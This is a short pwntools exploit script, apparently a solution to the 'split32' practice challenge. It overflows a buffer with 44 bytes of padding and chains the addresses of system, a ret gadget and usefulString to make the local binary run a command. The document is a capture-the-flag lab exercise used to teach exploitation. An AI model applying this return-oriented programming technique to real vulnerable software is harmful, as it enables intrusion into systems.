from pwn import *

p = process('./split32')
e = ELF('./split32')
rop = ROP(e)

payload = b'A' * 44
payload += p32(e.symbols['system'])
payload += p32(rop.find_gadget(['ret']).address)
payload += p32(e.symbols['usefulString'])

p.send(payload)
p.interactive()
